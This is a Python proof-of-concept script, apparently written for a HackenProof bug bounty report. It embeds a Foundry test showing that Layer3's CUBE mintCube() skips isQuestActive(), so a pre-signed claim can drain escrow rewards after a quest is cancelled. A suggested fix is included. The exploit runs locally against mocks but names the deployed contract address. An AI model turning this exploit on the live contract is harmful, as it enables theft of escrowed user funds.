#!/usr/bin/env python3
"""
Layer3 CUBE - Missing isQuestActive() Check
PoC Script — HackenProof Submission Aid

Finding:  mintCube() never calls isQuestActive(questId).
Impact:   Pre-signed CubeData with unused nonces can mint NFTs and drain
          escrow rewards AFTER a quest has been unpublished/cancelled.
Severity: HIGH (potentially Critical depending on escrow size)

Usage:
    # 1. Clone the repo and change into it
    git clone https://github.com/layer3xyz/cubes && cd cubes

    # 2. Install Python deps
    pip install web3 eth-account

    # 3. Run
    python3 /path/to/poc_layer3_quest_active_bypass.py

Requirements: foundry (forge, anvil) in PATH
"""

import subprocess
import sys
import os
import time
import textwrap
from pathlib import Path

# ── ANSI colours ──────────────────────────────────────────────────────────────
RED    = "\033[31m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
CYAN   = "\033[36m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def banner(text):    print(f"\n{BOLD}{CYAN}{'═'*65}{RESET}\n{BOLD}  {text}{RESET}\n{BOLD}{CYAN}{'═'*65}{RESET}")
def ok(text):        print(f"  {GREEN}[✓]{RESET} {text}")
def fail(text):      print(f"  {RED}[✗]{RESET} {text}")
def info(text):      print(f"  {YELLOW}[*]{RESET} {text}")
def step(n, text):   print(f"\n{BOLD}[STEP {n}]{RESET} {text}")

# ── Embedded Solidity PoC ─────────────────────────────────────────────────────
POC_SOLIDITY = r"""// SPDX-License-Identifier: MIT
// Layer3 CUBE — Missing isQuestActive() Check — Live PoC
// Demonstrates that mintCube() succeeds AFTER unpublishQuest(),
// allowing pre-signed CubeData to drain escrow rewards.
pragma solidity 0.8.20;

import {Test, console2}   from "forge-std/Test.sol";
import {CUBE}             from "../../src/CUBE.sol";
import {ITokenType}       from "../../src/escrow/interfaces/ITokenType.sol";
import {Helper}           from "../utils/Helper.t.sol";
import {MockERC20}        from "../mock/MockERC20.sol";
import {MessageHashUtils}  from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {IERC20}           from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1967Proxy}     from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// ── Minimal mock factory that acts as an escrow ──────────────────────────────
// In production the real Factory+Escrow system would hold funds; we simulate
// that here so the PoC shows actual token drainage, not just a print statement.
contract MockEscrowFactory {
    address public immutable rewardToken;
    constructor(address _token) { rewardToken = _token; }

    function distributeRewards(
        uint256,        // questId  – not validated in this mock
        address token,
        address to,
        uint256 amount,
        uint256,        // tokenId
        ITokenType.TokenType tokenType,
        uint256         // rakeBps
    ) external {
        // ERC20 path mirrors what real Factory→Escrow does
        if (tokenType == ITokenType.TokenType.ERC20) {
            IERC20(token).transfer(to, amount);
        }
    }
}

// ── Main PoC test ─────────────────────────────────────────────────────────────
contract PoCQuestActiveBypass is Test {
    using MessageHashUtils for bytes32;

    // EIP-712 domain constants (from DeployProxy.s.sol)
    string constant DOMAIN_NAME    = "LAYER3";
    string constant DOMAIN_VERSION = "1";

    // Scenario parameters
    uint256 constant QUEST_ID      = 1337;
    uint256 constant NONCE         = 0xDEADBEEF;
    uint256 constant REWARD_AMOUNT = 50_000 * 1e18;  // 50 000 tokens in escrow

    // Actors
    uint256 adminPk  = 0xA11CE;
    address admin    = vm.addr(0xA11CE);
    uint256 signerPk = 0x5163EB;          // backend signer (controlled in PoC)
    address signer   = vm.addr(0x5163EB);
    address attacker = makeAddr("attacker");
    address treasury = makeAddr("treasury");

    // Contracts
    CUBE               cube;
    MockERC20          rewardToken;
    MockEscrowFactory  mockFactory;
    Helper             helper;
    address            proxyAddress;

    // ── Setup ─────────────────────────────────────────────────────────────────
    function setUp() public {
        vm.label(admin,    "Admin");
        vm.label(signer,   "Signer (Layer3 backend)");
        vm.label(attacker, "Attacker (holds pre-signed msg)");
        vm.label(treasury, "Treasury");

        // Deploy CUBE implementation + ERC1967 proxy directly.
        // Avoids openzeppelin-foundry-upgrades FFI validator (which requires
        // CUBE_V4 reference that doesn't exist in local build).
        CUBE implementation = new CUBE();
        bytes memory initData = abi.encodeCall(
            CUBE.initialize,
            ("Layer3 CUBE", "CUBE", "LAYER3", "1", admin)
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), initData);
        proxyAddress = address(proxy);
        cube = CUBE(payable(proxyAddress));
        vm.label(proxyAddress, "CUBE Proxy");

        // Grant roles and set treasury
        vm.startPrank(admin);
        cube.grantRole(cube.SIGNER_ROLE(), signer);
        cube.setTreasury(treasury);
        vm.stopPrank();

        // Deploy reward token and mock escrow factory
        rewardToken  = new MockERC20();
        mockFactory  = new MockEscrowFactory(address(rewardToken));
        vm.label(address(rewardToken), "RewardToken (ERC20)");
        vm.label(address(mockFactory), "MockEscrowFactory");

        // Fund the mock factory (simulating a funded Escrow contract)
        rewardToken.mint(address(mockFactory), REWARD_AMOUNT);

        // Signer publishes quest on-chain (quest is now ACTIVE)
        vm.prank(signer);
        cube.initializeQuest(
            QUEST_ID,
            new string[](0),
            "High-Value Quest (50k tokens)",
            CUBE.Difficulty.ADVANCED,
            CUBE.QuestType.QUEST,
            new string[](0)
        );

        helper = new Helper();
    }

    // ── EIP-712 helpers ───────────────────────────────────────────────────────
    function _domainSeparator() internal view returns (bytes32) {
        return keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes(DOMAIN_NAME)),
            keccak256(bytes(DOMAIN_VERSION)),
            block.chainid,
            proxyAddress
        ));
    }

    function _signCubeData(CUBE.CubeData memory data, uint256 pk)
        internal view returns (bytes memory)
    {
        bytes32 digest = _domainSeparator().toTypedDataHash(helper.getStructHash(data));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  PROOF OF CONCEPT
    // ══════════════════════════════════════════════════════════════════════════
    function test_poc_questActiveBypass() public {
        console2.log("");
        console2.log("=============================================================");
        console2.log("  Layer3 CUBE - Missing isQuestActive() Check - PoC");
        console2.log("  Contract : 0x1195cf65f83b3a5768f3c496d3a05ad6412c64b7");
        console2.log("  Function : mintCube(CubeData,bytes)");
        console2.log("=============================================================");

        // ──────────────────────────────────────────────────────────────────────
        // PHASE 1 — Quest is live, escrow is funded
        // ──────────────────────────────────────────────────────────────────────
        console2.log("\n--- PHASE 1: Normal state ---");
        console2.log("  questId              :", QUEST_ID);
        console2.log("  isQuestActive()      :", cube.isQuestActive(QUEST_ID));
        console2.log("  Escrow reward tokens : 50,000");
        assertTrue(cube.isQuestActive(QUEST_ID));

        // ──────────────────────────────────────────────────────────────────────
        // PHASE 2 — Backend pre-signs CubeData for attacker's wallet
        //            (this mimics a user obtaining a signed claim before TX)
        // ──────────────────────────────────────────────────────────────────────
        console2.log("\n--- PHASE 2: Backend pre-signs CubeData (quest still active) ---");

        CUBE.RewardData memory reward = CUBE.RewardData({
            tokenAddress:         address(rewardToken),
            chainId:              block.chainid,
            amount:               REWARD_AMOUNT,
            tokenId:              0,
            tokenType:            ITokenType.TokenType.ERC20,
            rakeBps:              0,
            factoryAddress:       address(mockFactory),
            rewardRecipientAddress: attacker
        });

        CUBE.CubeData memory cubeData = CUBE.CubeData({
            questId:        QUEST_ID,
            nonce:          NONCE,
            price:          0,          // free mint — isolates the bug clearly
            isNative:       true,
            toAddress:      attacker,
            walletProvider: "MetaMask",
            tokenURI:       "ipfs://poc-layer3-quest-bypass",
            embedOrigin:    "layer3.xyz",
            transactions:   new CUBE.TransactionData[](0),
            recipients:     new CUBE.FeeRecipient[](0),
            reward:         reward
        });

        bytes memory signature = _signCubeData(cubeData, signerPk);
        console2.log("  EIP-712 signature created for nonce:", NONCE);
        console2.log("  [!] User holds signature but has NOT broadcast it yet");

        // ──────────────────────────────────────────────────────────────────────
        // PHASE 3 — Quest admin cancels the quest
        // ──────────────────────────────────────────────────────────────────────
        console2.log("\n--- PHASE 3: Quest admin calls unpublishQuest() ---");
        vm.prank(signer);
        cube.unpublishQuest(QUEST_ID);

        assertFalse(cube.isQuestActive(QUEST_ID));
        console2.log("  isQuestActive() after cancel :", cube.isQuestActive(QUEST_ID));
        console2.log("  Quest is now INACTIVE - minting should be impossible");
        console2.log("  Admin can now call Factory.withdrawFunds() to recover escrow...");

        // ──────────────────────────────────────────────────────────────────────
        // PHASE 4 — Attacker broadcasts pre-signed payload AFTER cancellation
        // ──────────────────────────────────────────────────────────────────────
        console2.log("\n--- PHASE 4: Attacker submits pre-signed CubeData (quest INACTIVE) ---");

        uint256 escrowBefore   = rewardToken.balanceOf(address(mockFactory));
        uint256 attackerBefore = rewardToken.balanceOf(attacker);
        uint256 nftBefore      = cube.balanceOf(attacker);

        console2.log("  Escrow token balance BEFORE  :", escrowBefore  / 1e18);
        console2.log("  Attacker token balance BEFORE:", attackerBefore / 1e18);
        console2.log("  Attacker CUBE NFT count BEFORE:", nftBefore);
        console2.log("");
        console2.log("  >>> Calling cube.mintCube() with isQuestActive() == FALSE ...");

        vm.prank(attacker);
        cube.mintCube{value: 0}(cubeData, signature);    // <─── BUG: succeeds!

        uint256 escrowAfter   = rewardToken.balanceOf(address(mockFactory));
        uint256 attackerAfter = rewardToken.balanceOf(attacker);
        uint256 nftAfter      = cube.balanceOf(attacker);

        // ──────────────────────────────────────────────────────────────────────
        // PHASE 5 — Results
        // ──────────────────────────────────────────────────────────────────────
        console2.log("");
        console2.log("--- PHASE 5: Results ---");
        console2.log("  mintCube() reverted          : NO  <-- VULNERABILITY");
        console2.log("  isQuestActive() during mint  : false");
        console2.log("  Escrow token balance AFTER   :", escrowAfter   / 1e18, "(was 50,000)");
        console2.log("  Attacker tokens received     :", attackerAfter / 1e18);
        console2.log("  Attacker CUBE NFTs minted    :", nftAfter - nftBefore);
        console2.log("");
        console2.log("=============================================================");
        console2.log("  VULNERABILITY CONFIRMED");
        console2.log("  Root cause : mintCube() never calls isQuestActive()");
        console2.log("  Impact     : Escrow drained after quest cancellation");
        console2.log("  Fix        : add require(isQuestActive(cubeData.questId))");
        console2.log("               inside mintCube() before _mintCube()");
        console2.log("=============================================================");

        // Hard assertions — test FAILS if these are not true
        assertEq(escrowAfter,               0,             "Escrow was NOT drained");
        assertEq(attackerAfter,   REWARD_AMOUNT,           "Attacker did not receive reward");
        assertEq(nftAfter - nftBefore,      1,             "CUBE NFT was not minted");
        assertFalse(cube.isQuestActive(QUEST_ID),          "Quest should remain inactive");
    }
}
"""

# ── Python helpers ─────────────────────────────────────────────────────────────
def run(cmd, cwd=None, capture=False):
    """Run a shell command, optionally capturing stdout."""
    result = subprocess.run(
        cmd, shell=True, cwd=cwd,
        capture_output=capture, text=True
    )
    return result

def check_prereqs(repo_dir):
    """Verify forge is installed and we're inside the cubes repo."""
    if run("forge --version", capture=True).returncode != 0:
        fail("forge not found — install Foundry: https://getfoundry.sh")
        sys.exit(1)
    ok("forge found")

    cube_sol = repo_dir / "src" / "CUBE.sol"
    if not cube_sol.exists():
        fail(f"src/CUBE.sol not found in {repo_dir}")
        fail("Run this script from inside the layer3xyz/cubes repository")
        sys.exit(1)
    ok(f"Repository root: {repo_dir}")


def write_poc(repo_dir):
    """Write PoC Solidity file into test/unit/."""
    poc_path = repo_dir / "test" / "unit" / "PoCQuestActiveBypass.t.sol"
    poc_path.write_text(POC_SOLIDITY)
    ok(f"PoC test written to: {poc_path.relative_to(repo_dir)}")
    return poc_path


def run_poc(repo_dir):
    """Execute the PoC via forge test and stream output."""
    info("Running: forge test --match-test test_poc_questActiveBypass -vv")
    info("(compiling contracts — this may take ~30 s the first time)\n")

    cmd = (
        "forge test "
        "--match-test test_poc_questActiveBypass "
        "--match-contract PoCQuestActiveBypass "
        "-vv "
        "2>&1"
    )
    proc = subprocess.Popen(
        cmd, shell=True, cwd=str(repo_dir),
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )

    output_lines = []
    for line in proc.stdout:
        output_lines.append(line)
        # Colour-code key lines
        stripped = line.strip()
        if "PASS" in stripped or "✓" in stripped or "VULNERABILITY CONFIRMED" in stripped:
            print(f"{GREEN}{line}{RESET}", end="")
        elif "FAIL" in stripped or "Error" in stripped or "revert" in stripped.lower():
            print(f"{RED}{line}{RESET}", end="")
        elif stripped.startswith("---") or stripped.startswith("==="):
            print(f"{CYAN}{line}{RESET}", end="")
        elif "[PHASE" in stripped or ">>>" in stripped:
            print(f"{YELLOW}{line}{RESET}", end="")
        else:
            print(line, end="")

    proc.wait()
    return proc.returncode, "".join(output_lines)


def parse_result(returncode, output):
    """Print a final verdict."""
    banner("FINAL VERDICT")
    if returncode == 0 and "VULNERABILITY CONFIRMED" in output:
        ok(f"{BOLD}Test PASSED — vulnerability confirmed{RESET}")
        print(f"""
{BOLD}Finding Summary{RESET}
  Title    : Missing isQuestActive() check in mintCube()
  Severity : HIGH (→ Critical if large escrow at risk)
  Contract : CUBE.sol (all chains at 0x1195cf65f83b3a5768f3c496d3a05ad6412c64b7)
  Function : mintCube(CubeData calldata, bytes calldata)

{BOLD}Proof{RESET}
  1. Quest published  → isQuestActive() = true
  2. Signer pre-signs CubeData with escrow reward
  3. unpublishQuest() called → isQuestActive() = false
  4. mintCube() called with pre-signed data → SUCCEEDS
  5. Escrow rewards drained, CUBE NFT minted for INACTIVE quest

{BOLD}Root Cause{RESET} (CUBE.sol)
  mintCube() checks:
    ✓ s_isMintingActive
    ✓ s_treasury != address(0)
    ✓ msg.value >= cubeData.price
    ✓ valid EIP-712 signature
    ✓ nonce not used
    ✗ isQuestActive(cubeData.questId)  ← MISSING

{BOLD}Fix{RESET}
  // In mintCube(), before calling _mintCube():
  if (!isQuestActive(cubeData.questId))
      revert CUBE__QuestIsInactive();
""")
    elif returncode == 0 and "FAIL" in output:
        fail("Test ran but assertions failed — check output above")
    else:
        fail(f"forge test exited with code {returncode}")
        fail("Check the output above for compilation errors")
        info("Common fixes:")
        info("  • Make sure you are inside the layer3xyz/cubes repository")
        info("  • Run: forge build  (ensure contracts compile)")
        info("  • Check foundry.toml has ffi = true and ast = true")


def cleanup(poc_path):
    """Remove the PoC test file."""
    try:
        poc_path.unlink()
        info(f"Cleaned up: {poc_path.name}")
    except Exception:
        pass


# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    banner("Layer3 CUBE — isQuestActive() Bypass — Live PoC")
    print(f"  {YELLOW}Target  :{RESET} CUBE.sol (layer3xyz/cubes)")
    print(f"  {YELLOW}Finding :{RESET} mintCube() missing isQuestActive() check")
    print(f"  {YELLOW}Impact  :{RESET} Escrow drain after quest cancellation\n")

    repo_dir = Path(os.getcwd())

    step(1, "Checking prerequisites")
    check_prereqs(repo_dir)

    step(2, "Writing PoC Solidity test")
    poc_path = write_poc(repo_dir)

    step(3, "Executing PoC via forge test")
    returncode, output = run_poc(repo_dir)

    step(4, "Verdict")
    parse_result(returncode, output)

    step(5, "Cleanup")
    cleanup(poc_path)


if __name__ == "__main__":
    main()
